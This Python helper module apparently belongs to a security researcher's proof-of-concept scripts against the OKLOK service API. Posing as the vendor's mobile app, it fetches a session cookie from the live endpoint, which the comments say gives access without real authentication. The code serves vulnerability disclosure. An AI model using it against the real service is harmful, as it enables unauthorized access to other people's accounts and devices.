#!/bin/python3

import js2py
import requests

# Just some get functions for values that are needed throughout PoC scripts
# Crafted by Abdullah Ansari while at WithSecure

fresh_cookie = None

def set_cookie():

    # Cookies seem to be generated and checked for legitimacy but aren't checked for ACTUAL authentication or authorization
    
    url = "http://service.oklok.net/app/info/detail"
    
    headers = { 
        "Content-Type": "application/json",
        "Connection": "close",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/20) uni-app",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate"
    }
    
    payload = "{}"

    proxy = get_proxy()

    response = requests.post(url, headers=headers, data=payload, proxies=proxy)

    connect_sid_cookie = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
    
    valid_cookie = {"connect.sid": connect_sid_cookie}

    global fresh_cookie

    fresh_cookie = valid_cookie

def get_cookie():

    if fresh_cookie is None:
        
        set_cookie()

        return fresh_cookie

    else:
       
        return fresh_cookie

def get_proxy():

    proxy = None

    # If you want to analyze the traffic in Burp Suite, just comment out the proxy variable set to None, and uncomment the proxy variable below

    # proxy = { "http":"http://127.0.0.1:8080" }

    return proxy

def get_date_string():

    get_date_string_internal = js2py.eval_js('function get_date_string(){ const raw_date = new Date();var year = raw_date.getFullYear();var month = ("0" + (raw_date.getMonth()+1)).slice(-2);var date = ("0" + (raw_date.getDate()+1)).slice(-2);var hour = ("0" + (raw_date.getHours()+1)).slice(-2);var minute = ("0" + (raw_date.getMinutes()+1)).slice(-2);var second = ("0" + (raw_date.getSeconds()+1)).slice(-2);var formatted_date_string = year + "-" + month + "-" + date + " " + hour + ":" + minute + ":" + second;return formatted_date_string;}')
    
    date_string = get_date_string_internal()

    return date_string
